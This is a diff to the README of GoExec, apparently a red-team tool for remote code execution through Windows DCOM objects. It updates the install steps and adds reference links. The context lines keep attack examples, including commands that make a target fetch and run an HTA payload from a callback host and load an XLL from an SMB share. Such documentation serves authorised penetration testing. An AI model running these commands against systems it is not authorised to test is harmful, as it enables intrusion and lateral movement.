@@ -13,8 +13,8 @@ The original post about GoExec v0.1.0 can be found [here](https://www.falconops.
 To build this project from source, you will need Go version 1.23.* or greater and a 64-bit target architecture. More information on managing Go installations can be found [here](https://go.dev/doc/manage-install)
 
 ```shell
-# Install goexec
-CGO_ENABLED=0 go install -ldflags="-s -w" github.com/FalconOpsLLC/goexec@latest
+# Install goexec (release)
+go install -ldflags="-s -w" -trimpath "github.com/FalconOpsLLC/goexec@latest"
 ```
 
 #### Manual Installation
@@ -22,16 +22,8 @@ CGO_ENABLED=0 go install -ldflags="-s -w" github.com/FalconOpsLLC/goexec@latest
 For pre-release features, fetch the latest commit and build manually.
 
 ```shell
-# (Linux) Install GoExec manually from source
-# Fetch source
-git clone https://github.com/FalconOpsLLC/goexec
-cd goexec
-
-# Build goexec (Go >= 1.23)
-CGO_ENABLED=0 go build -ldflags="-s -w"
-
-# (Optional) Install goexec to /usr/local/bin/goexec
-sudo install goexec /usr/local/bin
+# Install goexec (development)
+go install -ldflags="-s -w" -trimpath "github.com/FalconOpsLLC/goexec@main"
 ```
 
 ### Install with Docker
@@ -44,8 +36,8 @@ We've provided a Dockerfile to build and run GoExec within Docker containers.
 git clone https://github.com/FalconOpsLLC/goexec
 cd goexec
 
-# Build goexec image (as root/docker group)
-docker build . --tag goexec --network host
+# Build goexec image; Must be root or docker group member.
+docker build . --tag goexec
 
 # Run goexec via Docker container
 alias goexec='sudo docker run -it --rm goexec'
@@ -304,6 +296,13 @@ goexec dcom shellwindows "$target" \
   --app-window 3 # Maximized
 ```
 
+##### References
+
+- [Lateral Movement via DCOM: Round 2](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/) - [Matt Nelson](https://github.com/enigma0x3)
+- [ShellWindows Object](https://learn.microsoft.com/en-us/windows/win32/shell/shellwindows)
+- [ShellWindows.Item Method](https://learn.microsoft.com/en-us/windows/win32/shell/shellwindows-item)
+- [ShellExecute Method](https://learn.microsoft.com/en-us/windows/win32/shell/shell-shellexecute)
+
 #### `ShellBrowserWindow` Method (`dcom shellbrowserwindow`)
 
 The `shellbrowserwindow` method uses the exposed [ShellBrowserWindow](https://strontic.github.io/xcyclopedia/library/clsid_c08afd90-f2a1-11d1-8455-00a0c91f3880.html) DCOM object to call `Document.Application.ShellExecute` and spawn the provided process. The potential constraints of this method are similar to the [ShellWindows method](#shellwindows-method-dcom-shellwindows).
@@ -336,6 +335,12 @@ goexec dcom shellbrowserwindow "$target" \
   -e 'explorer.exe' \
   --app-window 3
 ```
+
+##### References
+
+- [Lateral Movement via DCOM: Round 2](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/) - [Matt Nelson](https://github.com/enigma0x3)
+- [ShellBrowserWindow Object](https://strontic.github.io/xcyclopedia/library/clsid_c08afd90-f2a1-11d1-8455-00a0c91f3880.html)
+- [ShellExecute Method](https://learn.microsoft.com/en-us/windows/win32/shell/shell-shellexecute)
 
 #### `htafile` Method (`dcom htafile`)
 
@@ -383,6 +388,12 @@ goexec dcom htafile "$target" \
   --url "http://callback.lan/payload.hta"
 ```
 
+##### References
+
+- [LethalHTA](https://github.com/codewhitesec/LethalHTA) & [Accompanied Blog Post](https://codewhitesec.blogspot.com/2018/07/lethalhta.html)
+- [Go-MSRPC Example: dcom_urlmon_htafile_exec.go](https://github.com/oiweiwei/go-msrpc/blob/main/examples/dcom_urlmon_htafile_exec.go)
+- [IPersistMoniker Interface](https://learn.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/ms775042(v=vs.85))
+
 #### Visual Studio `ExecuteCommand` Method (`dcom visualstudio dte`)
 
 The `visualstudio dte` method uses the exposed `VisualStudio.DTE` object to spawn a process via the `ExecuteCommand` method.
@@ -425,10 +436,17 @@ goexec dcom visualstudio dte "$target" \
   --args '/c set' -o-
 ```
 
+##### References
+
+- [Developers are juicy targets: DCOM & Visual Studio - Juan Manuel Fernandez](https://adepts.of0x.cc/visual-studio-dcom/)
+- [Visual Studio DTE Interface](https://learn.microsoft.com/en-us/dotnet/api/envdte.dte)
+- [EnvDTE.ExecuteCommand Method](https://learn.microsoft.com/en-us/dotnet/api/envdte._dte.executecommand)
+- [Visual Studio Shell Command](https://learn.microsoft.com/en-us/visualstudio/ide/reference/shell-command?view=visualstudio)
+
 #### Excel Methods (`dcom excel`)
 
 The `dcom excel` command group contains remote execution methods targeting Microsoft Excel.
-Each of these methods assume that the remote host has Excel installed.
+Each method assumes that the remote host has Excel installed.
 
 ```text
 Usage:
@@ -480,6 +498,12 @@ goexec dcom excel macro "$target" \
   -M 'CALL("user32","MessageBoxA","JJCCJ",1,"GoExec rules","bryan was here",0)'
 ```
 
+##### References
+
+- [Excel.Application.ExecuteExcel4Macro Method](https://learn.microsoft.com/en-us/office/vba/api/excel.application.executeexcel4macro)
+- [Excel 4.0 Functions Reference](https://d13ot9o61jdzpp.cloudfront.net/files/Excel%204.0%20Macro%20Functions%20Reference.pdf)
+- [Excel 4.0 CALL & REGISTER Functions Reference](https://support.microsoft.com/en-us/office/using-the-call-and-register-functions-06fa83c1-2869-4a89-b665-7e63d188307f)
+
 #### (Auxiliary) Excel `RegisterXLL` Method (`dcom excel xll`)
 
 The `xll` method uses the exposed Excel.Application DCOM object to call RegisterXLL, thus loading a XLL/DLL from the remote filesystem or an UNC path.
@@ -510,6 +534,12 @@ goexec dcom excel xll "$target" \
   --nt-hash "$auth_nt" \
   --xll '\\smbserver.lan\share\addin.xll'
 ```
+
+##### References
+
+- [DLL Execution via Excel.Applicatoin RegisterXLL() method](https://gist.github.com/byt3bl33d3r/d264cb65e9e3d5e3324635e24ae971a7)
+- [Excel.Application.RegisterXLL Method](https://learn.microsoft.com/en-us/office/vba/api/excel.application.registerxll)
+
 
 ### Task Scheduler Module (`tsch`)
 
